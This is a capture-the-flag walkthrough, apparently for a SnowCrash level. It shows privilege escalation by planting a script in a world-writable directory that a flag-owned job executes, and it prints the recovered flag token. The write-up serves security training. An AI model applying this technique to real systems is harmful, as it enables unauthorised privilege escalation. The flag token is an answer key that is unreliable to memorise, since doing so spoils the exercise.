##### 1 - We search for files who belongs to user flag05
``find / -user flag05 2>/dev/null``
>/usr/sbin/openarenaserver
>/rofs/usr/sbin/openarenaserver

----

##### 2 - Analyze file
Trying to start the program
``openarenaserver``
>bash: /usr/sbin/openarenaserver: Permission denied

Checking permissions
``ls -l /usr/sbin/openarenaserver``
>-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

``getfacl /usr/sbin/openarenaserver``
>getfacl: Removing leading '/' from absolute path names
>\# file: usr/sbin/openarenaserver
>\# owner: flag05
>\# group: flag05
>user::rwx
>user:level05:r--
>group::r-x
>mask::r-x
>other::---

Looking for clues, and finding something interesting

``cat /usr/sbin/openarenaserver``
>\#!/bin/sh
>for i in /opt/openarenaserver/* ; do
>	(ulimit -t 5; bash -x "$i")
>	rm -f "$i"
>done

Openarenaserver launch script in /opt/openarenaserver/ folder

----

##### 3 - Creating script

Checking folder permissions, we can write in it !
``ls -ld /opt/openarenaserver/``
>drwxrwxr-x+ 2 root root 40 Jun 18 14:49 /opt/openarenaserver/

Create a bash script
``echo '/bin/getflag | wall' > /opt/openarenaserver/exploit.sh``

Adding execution permission
``chmod +x /opt/openarenaserver/exploit.sh``

----

##### 4 - Getting the flag

Waiting for broadcast message
>Broadcast Message from flag05@Snow
>        (somewhere) at 17:58 ...
>
>Check flag.Here is your token : **viuaaale9huek52boumoomioc**
